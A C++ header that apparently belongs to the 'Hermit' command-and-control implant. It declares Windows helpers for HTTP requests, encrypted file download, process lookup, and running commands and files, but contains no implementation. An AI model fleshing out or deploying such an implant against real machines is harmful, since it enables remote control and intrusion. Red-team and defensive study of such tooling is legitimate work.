#ifndef HERMIT_CORE_SYSTEM_HPP
#define HERMIT_CORE_SYSTEM_HPP

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <tlhelp32.h>
#include <vector>

#include "core/crypt.hpp"
#include "core/procs.hpp"
#include "core/stdout.hpp"
#include "core/utils.hpp"

namespace System::Arch
{
    std::wstring GetName(WORD wProcessorArchitecture);
}

namespace System::Env
{
    std::wstring GetStrings(const std::wstring& envVar);
}

namespace System::Http
{
    struct WinHttpHandlers {
        HINTERNET hSession;
        HINTERNET hConnect;
    };

    struct WinHttpResponse {
        BOOL bResult;
        HINTERNET hRequest;
        DWORD dwStatusCode;
    };

    WinHttpHandlers InitRequest(
        Procs::PPROCS pProcs,
        LPCWSTR lpHost,
        INTERNET_PORT nPort
    );

    WinHttpResponse SendRequest(
        Procs::PPROCS pProcs,
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpMethod,
        LPCWSTR lpHeaders,
        LPVOID lpData,
        DWORD dwDataLength
    );

    std::vector<BYTE> ReadResponseBytes(
        Procs::PPROCS pProcs,
        HINTERNET hRequest
    );

    std::wstring ReadResponseText(
        Procs::PPROCS pProcs,
        HINTERNET hRequest
    );

    BOOL DownloadFile(
        Procs::PPROCS pProcs,
        Crypt::PCRYPT pCrypt,
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpHeaders,
        const std::wstring& wInfoJSON,
        const std::wstring& wDest
    );

    VOID WinHttpCloseHandles(
        Procs::PPROCS pProcs,
        HINTERNET hSession,
        HINTERNET hConnect,
        HINTERNET hRequest
    );
}

namespace System::Process
{
    DWORD GetProcessIdByName(LPCWSTR lpProcessName);
    std::wstring ExecuteCmd(const std::wstring& cmd);
    BOOL ExecuteFile(const std::wstring& filePath);
}

#endif // HERMIT_CORE_SYSTEM_HPP